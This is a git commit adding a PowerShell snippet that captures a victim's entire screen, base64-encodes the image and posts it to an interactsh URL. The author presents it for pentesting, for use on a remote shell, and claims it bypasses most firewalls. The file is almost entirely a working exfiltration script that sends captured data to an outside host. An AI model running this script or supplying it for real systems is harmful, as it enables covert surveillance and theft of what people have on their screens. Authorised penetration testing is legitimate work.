ea97cda51c619ee26b5994aeadbabaa2039e69e2
Vincent Cox <info@vincentcox.com>
2021-11-01 17:26:51 +0100

    Create screenshot_exfiltrate.ps1

---
+++ snippets/screenshot_exfiltrate.ps1
@@ -0,0 +1,22 @@
+<#
+   This script will make a screenshot and send it over HTTP to your interactsh server. Handy if you have a remote (powershell) shell and want to see what the victim is doing.
+   For pentesting this is recommend too because it gets the non-tech people excited because it's visual. 
+   Bypasses most firewalls.
+   Go to https://app.interactsh.com/ and copy the interactsh URL and adjust it in the script
+#>
+
+$File = "$Env:PUBLIC\Screenshot1.bmp" 
+Add-Type -AssemblyName System.Windows.Forms
+Add-type -AssemblyName System.Drawing
+$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+$Width = $Screen.Width*2
+$Height = $Screen.Height*2
+$Left = $Screen.Left
+$Top = $Screen.Top
+$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
+$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
+$bitmap.Save($File)
+$uri = "http://XXXXX.interactsh.com"          #   <------- EDIT THIS URL ------------- 
+$b64txt = [convert]::ToBase64String((Get-Content -path $File -Encoding byte))
+Invoke-WebRequest -uri $uri -Method Post -Body $b64txt
